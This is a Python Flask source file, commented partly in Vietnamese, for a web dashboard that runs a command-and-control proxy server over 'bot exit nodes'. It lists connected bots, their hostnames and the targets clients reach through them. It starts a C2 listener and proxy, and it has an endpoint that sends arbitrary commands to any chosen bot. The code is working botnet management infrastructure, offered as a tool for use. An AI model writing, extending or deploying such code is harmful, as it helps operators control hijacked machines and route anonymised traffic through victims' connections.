#!/usr/bin/env python3
"""
PROXY WEB DASHBOARD
Giao diện web để quản lý C2 proxy server và bot exit nodes
"""

import os
import sys
import json
import time
import threading
from datetime import datetime, timedelta
from flask import Flask, render_template, jsonify, request, redirect, url_for, session
from flask_socketio import SocketIO, emit
import psutil

# Add current directory to path for imports
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from c2_proxy_server import C2ProxyServer
    from proxy_load_balancer import ProxyLoadBalancer, BotHealthMonitor
except ImportError:
    print("❌ Import error: Make sure c2_proxy_server.py and proxy_load_balancer.py are in the same directory")
    sys.exit(1)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'proxy_dashboard_secret_key_2024'
socketio = SocketIO(app, cors_allowed_origins="*")

# Global variables
proxy_server = None
load_balancer = None
health_monitor = None
dashboard_stats = {
    'start_time': datetime.now(),
    'total_requests': 0,
    'total_bytes': 0,
    'active_connections': 0,
    'bot_count': 0
}

@app.route('/')
def index():
    """Trang chủ dashboard"""
    return render_template('proxy_dashboard.html')

@app.route('/api/status')
def api_status():
    """API lấy trạng thái server"""
    if not proxy_server:
        return jsonify({'error': 'Proxy server not running'}), 500
        
    try:
        status = proxy_server.get_status()
        lb_stats = load_balancer.get_load_balancing_stats() if load_balancer else {}
        health_status = health_monitor.get_health_status(proxy_server.bot_exit_nodes) if health_monitor else {}
        
        return jsonify({
            'server_status': status,
            'load_balancer_stats': lb_stats,
            'health_status': health_status,
            'dashboard_stats': dashboard_stats,
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/bots')
def api_bots():
    """API lấy danh sách bot"""
    if not proxy_server:
        return jsonify({'error': 'Proxy server not running'}), 500
        
    try:
        bots = []
        for bot_id, bot_info in proxy_server.connected_bots.items():
            exit_node_info = proxy_server.bot_exit_nodes.get(bot_id, {})
            
            bot_data = {
                'bot_id': bot_id,
                'hostname': bot_info.get('hostname', 'Unknown'),
                'address': bot_info.get('address', ('Unknown', 0)),
                'status': bot_info.get('status', 'unknown'),
                'connected_at': bot_info.get('connected_at', datetime.now()).isoformat(),
                'last_seen': bot_info.get('last_seen', datetime.now()).isoformat(),
                'proxy_mode': bot_info.get('proxy_mode', False),
                'requests_handled': bot_info.get('requests_handled', 0),
                'bytes_transferred': bot_info.get('bytes_transferred', 0),
                'exit_node_info': {
                    'status': exit_node_info.get('status', 'inactive'),
                    'connections': exit_node_info.get('connections', 0),
                    'max_connections': exit_node_info.get('max_connections', 0),
                    'health_score': exit_node_info.get('health_score', 0),
                    'total_requests': exit_node_info.get('total_requests', 0),
                    'successful_requests': exit_node_info.get('successful_requests', 0),
                    'failed_requests': exit_node_info.get('failed_requests', 0),
                    'circuit_breaker_state': exit_node_info.get('circuit_breaker_state', 'closed')
                }
            }
            bots.append(bot_data)
            
        return jsonify({'bots': bots})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/connections')
def api_connections():
    """API lấy danh sách kết nối proxy"""
    if not proxy_server:
        return jsonify({'error': 'Proxy server not running'}), 500
        
    try:
        connections = []
        for conn_id, conn_info in proxy_server.active_proxy_connections.items():
            connection_data = {
                'connection_id': conn_id,
                'client_addr': conn_info.get('client_addr', ('Unknown', 0)),
                'bot_id': conn_info.get('bot_id', 'Unknown'),
                'target_host': conn_info.get('target_host', 'Unknown'),
                'target_port': conn_info.get('target_port', 0),
                'is_https': conn_info.get('is_https', False),
                'start_time': conn_info.get('start_time', datetime.now()).isoformat(),
                'bytes_transferred': conn_info.get('bytes_transferred', 0)
            }
            connections.append(connection_data)
            
        return jsonify({'connections': connections})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/load_balancer')
def api_load_balancer():
    """API lấy thông tin load balancer"""
    if not load_balancer:
        return jsonify({'error': 'Load balancer not available'}), 500
        
    try:
        stats = load_balancer.get_load_balancing_stats()
        recommendations = load_balancer.get_bot_recommendations()
        
        return jsonify({
            'stats': stats,
            'recommendations': recommendations
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/start_server', methods=['POST'])
def api_start_server():
    """API khởi động proxy server"""
    global proxy_server, load_balancer, health_monitor
    
    try:
        data = request.get_json()
        c2_host = data.get('c2_host', '0.0.0.0')
        c2_port = data.get('c2_port', 7777)
        proxy_port = data.get('proxy_port', 8080)
        
        if proxy_server and proxy_server.running:
            return jsonify({'error': 'Server is already running'}), 400
            
        # Create new server instance
        proxy_server = C2ProxyServer(c2_host, c2_port, proxy_port)
        load_balancer = ProxyLoadBalancer()
        health_monitor = BotHealthMonitor()
        
        # Start server in separate thread
        server_thread = threading.Thread(target=proxy_server.start, daemon=True)
        server_thread.start()
        
        # Wait a moment for server to start
        time.sleep(2)
        
        return jsonify({
            'message': 'Server started successfully',
            'c2_host': c2_host,
            'c2_port': c2_port,
            'proxy_port': proxy_port
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stop_server', methods=['POST'])
def api_stop_server():
    """API dừng proxy server"""
    global proxy_server
    
    try:
        if not proxy_server or not proxy_server.running:
            return jsonify({'error': 'Server is not running'}), 400
            
        proxy_server.stop()
        proxy_server = None
        
        return jsonify({'message': 'Server stopped successfully'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/bot_command', methods=['POST'])
def api_bot_command():
    """API gửi lệnh đến bot"""
    if not proxy_server:
        return jsonify({'error': 'Proxy server not running'}), 500
        
    try:
        data = request.get_json()
        bot_id = data.get('bot_id')
        command = data.get('command')
        
        if not bot_id or not command:
            return jsonify({'error': 'Missing bot_id or command'}), 400
            
        if bot_id not in proxy_server.connected_bots:
            return jsonify({'error': 'Bot not found'}), 404
            
        bot_info = proxy_server.connected_bots[bot_id]
        bot_socket = bot_info['socket']
        
        # Send command to bot
        bot_socket.send(command.encode())
        
        return jsonify({'message': f'Command sent to bot {bot_id}'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/load_balancer_strategy', methods=['POST'])
def api_load_balancer_strategy():
    """API thay đổi load balancing strategy"""
    if not load_balancer:
        return jsonify({'error': 'Load balancer not available'}), 500
        
    try:
        data = request.get_json()
        strategy = data.get('strategy')
        
        if not strategy:
            return jsonify({'error': 'Missing strategy'}), 400
            
        if strategy not in load_balancer.load_balancing_strategies:
            return jsonify({'error': 'Invalid strategy'}), 400
            
        # Update strategy (this would need to be implemented in the load balancer)
        return jsonify({'message': f'Load balancing strategy changed to {strategy}'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    print(f"Client connected: {request.sid}")
    emit('status', {'message': 'Connected to proxy dashboard'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    print(f"Client disconnected: {request.sid}")

@socketio.on('request_status')
def handle_status_request():
    """Handle status request from client"""
    if proxy_server:
        try:
            status = proxy_server.get_status()
            lb_stats = load_balancer.get_load_balancing_stats() if load_balancer else {}
            health_status = health_monitor.get_health_status(proxy_server.bot_exit_nodes) if health_monitor else {}
            
            emit('status_update', {
                'server_status': status,
                'load_balancer_stats': lb_stats,
                'health_status': health_status,
                'dashboard_stats': dashboard_stats,
                'timestamp': datetime.now().isoformat()
            })
        except Exception as e:
            emit('error', {'message': str(e)})

def update_dashboard_stats():
    """Cập nhật thống kê dashboard"""
    global dashboard_stats
    
    while True:
        try:
            if proxy_server:
                status = proxy_server.get_status()
                dashboard_stats.update({
                    'total_requests': status['stats']['total_requests'],
                    'total_bytes': status['stats']['total_bytes_transferred'],
                    'active_connections': status['stats']['active_connections'],
                    'bot_count': status['connected_bots']
                })
                
                # Emit real-time updates
                socketio.emit('stats_update', dashboard_stats)
                
        except Exception as e:
            print(f"❌ Error updating dashboard stats: {e}")
            
        time.sleep(5)  # Update every 5 seconds

def create_dashboard_template():
    """Tạo template HTML cho dashboard"""
    template_dir = os.path.join(os.path.dirname(__file__), 'templates')
    os.makedirs(template_dir, exist_ok=True)
    
    template_path = os.path.join(template_dir, 'proxy_dashboard.html')
    
    if not os.path.exists(template_path):
        html_content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Proxy Dashboard</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #667eea;
        }
        .stat-label {
            color: #666;
            margin-top: 5px;
        }
        .section {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .section h2 {
            margin-top: 0;
            color: #333;
            border-bottom: 2px solid #667eea;
            padding-bottom: 10px;
        }
        .bot-list, .connection-list {
            max-height: 400px;
            overflow-y: auto;
        }
        .bot-item, .connection-item {
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 10px;
            background: #f9f9f9;
        }
        .bot-status {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            font-weight: bold;
        }
        .status-online { background: #d4edda; color: #155724; }
        .status-offline { background: #f8d7da; color: #721c24; }
        .status-warning { background: #fff3cd; color: #856404; }
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        .btn-primary { background: #667eea; color: white; }
        .btn-danger { background: #dc3545; color: white; }
        .btn-success { background: #28a745; color: white; }
        .btn:hover { opacity: 0.8; }
        .chart-container {
            height: 300px;
            margin-top: 20px;
        }
        .health-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 5px;
        }
        .health-excellent { background: #28a745; }
        .health-good { background: #17a2b8; }
        .health-warning { background: #ffc107; }
        .health-critical { background: #dc3545; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 C2 Proxy Dashboard</h1>
            <p>Real-time monitoring and management of proxy server and bot exit nodes</p>
        </div>

        <div class="controls">
            <button class="btn btn-primary" onclick="startServer()">Start Server</button>
            <button class="btn btn-danger" onclick="stopServer()">Stop Server</button>
            <button class="btn btn-success" onclick="refreshData()">Refresh</button>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="total-requests">0</div>
                <div class="stat-label">Total Requests</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="total-bytes">0</div>
                <div class="stat-label">Bytes Transferred</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="active-connections">0</div>
                <div class="stat-label">Active Connections</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="bot-count">0</div>
                <div class="stat-label">Connected Bots</div>
            </div>
        </div>

        <div class="section">
            <h2>📊 Server Status</h2>
            <div id="server-status">
                <p>Server status will be displayed here...</p>
            </div>
        </div>

        <div class="section">
            <h2>🤖 Connected Bots</h2>
            <div class="bot-list" id="bot-list">
                <p>Bot list will be displayed here...</p>
            </div>
        </div>

        <div class="section">
            <h2>🔗 Active Connections</h2>
            <div class="connection-list" id="connection-list">
                <p>Connection list will be displayed here...</p>
            </div>
        </div>

        <div class="section">
            <h2>⚖️ Load Balancer</h2>
            <div id="load-balancer-info">
                <p>Load balancer information will be displayed here...</p>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        
        socket.on('connect', function() {
            console.log('Connected to dashboard');
            socket.emit('request_status');
        });
        
        socket.on('status_update', function(data) {
            updateDashboard(data);
        });
        
        socket.on('stats_update', function(stats) {
            updateStats(stats);
        });
        
        socket.on('error', function(data) {
            console.error('Dashboard error:', data.message);
            alert('Error: ' + data.message);
        });
        
        function updateDashboard(data) {
            // Update server status
            const serverStatus = document.getElementById('server-status');
            serverStatus.innerHTML = `
                <p><strong>Running:</strong> ${data.server_status.running ? 'Yes' : 'No'}</p>
                <p><strong>C2 Server:</strong> ${data.server_status.c2_host}:${data.server_status.c2_port}</p>
                <p><strong>Proxy Server:</strong> ${data.server_status.c2_host}:${data.server_status.proxy_port}</p>
                <p><strong>Connected Bots:</strong> ${data.server_status.connected_bots}</p>
                <p><strong>Active Exit Nodes:</strong> ${data.server_status.active_exit_nodes}</p>
            `;
            
            // Update bot list
            updateBotList(data.server_status.bots);
            
            // Update load balancer info
            updateLoadBalancerInfo(data.load_balancer_stats);
        }
        
        function updateStats(stats) {
            document.getElementById('total-requests').textContent = stats.total_requests || 0;
            document.getElementById('total-bytes').textContent = formatBytes(stats.total_bytes || 0);
            document.getElementById('active-connections').textContent = stats.active_connections || 0;
            document.getElementById('bot-count').textContent = stats.bot_count || 0;
        }
        
        function updateBotList(bots) {
            const botList = document.getElementById('bot-list');
            if (!bots || bots.length === 0) {
                botList.innerHTML = '<p>No bots connected</p>';
                return;
            }
            
            let html = '';
            bots.forEach(bot => {
                const statusClass = bot.status === 'online' ? 'status-online' : 'status-offline';
                html += `
                    <div class="bot-item">
                        <h4>${bot.bot_id}</h4>
                        <p><strong>Hostname:</strong> ${bot.hostname}</p>
                        <p><strong>Status:</strong> <span class="bot-status ${statusClass}">${bot.status}</span></p>
                        <p><strong>Proxy Mode:</strong> ${bot.proxy_mode ? 'Enabled' : 'Disabled'}</p>
                        <p><strong>Requests:</strong> ${bot.requests_handled}</p>
                        <p><strong>Bytes:</strong> ${formatBytes(bot.bytes_transferred)}</p>
                    </div>
                `;
            });
            botList.innerHTML = html;
        }
        
        function updateLoadBalancerInfo(lbStats) {
            const lbInfo = document.getElementById('load-balancer-info');
            if (!lbStats) {
                lbInfo.innerHTML = '<p>Load balancer not available</p>';
                return;
            }
            
            lbInfo.innerHTML = `
                <p><strong>Total Bots:</strong> ${lbStats.total_bots}</p>
                <p><strong>Active Bots:</strong> ${lbStats.active_bots}</p>
                <p><strong>Total Connections:</strong> ${lbStats.total_connections}</p>
                <p><strong>Total Requests:</strong> ${lbStats.total_requests}</p>
                <p><strong>Total Bytes:</strong> ${formatBytes(lbStats.total_bytes)}</p>
            `;
        }
        
        function formatBytes(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }
        
        function startServer() {
            fetch('/api/start_server', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    c2_host: '0.0.0.0',
                    c2_port: 7777,
                    proxy_port: 8080
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    alert('Error: ' + data.error);
                } else {
                    alert('Server started successfully');
                    refreshData();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error starting server');
            });
        }
        
        function stopServer() {
            fetch('/api/stop_server', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    alert('Error: ' + data.error);
                } else {
                    alert('Server stopped successfully');
                    refreshData();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error stopping server');
            });
        }
        
        function refreshData() {
            socket.emit('request_status');
        }
        
        // Auto-refresh every 30 seconds
        setInterval(refreshData, 30000);
    </script>
</body>
</html>'''
        
        with open(template_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"✅ Created dashboard template: {template_path}")

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description="C2 Proxy Web Dashboard")
    parser.add_argument("--host", default="0.0.0.0", help="Dashboard host")
    parser.add_argument("--port", type=int, default=5001, help="Dashboard port")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    
    args = parser.parse_args()
    
    # Create dashboard template
    create_dashboard_template()
    
    # Start stats update thread
    stats_thread = threading.Thread(target=update_dashboard_stats, daemon=True)
    stats_thread.start()
    
    print(f"🚀 Starting C2 Proxy Dashboard...")
    print(f"   Dashboard: http://{args.host}:{args.port}")
    print(f"   Template: {os.path.join(os.path.dirname(__file__), 'templates', 'proxy_dashboard.html')}")
    
    try:
        socketio.run(app, host=args.host, port=args.port, debug=args.debug)
    except KeyboardInterrupt:
        print("\n🛑 Dashboard stopped")

if __name__ == "__main__":
    main()
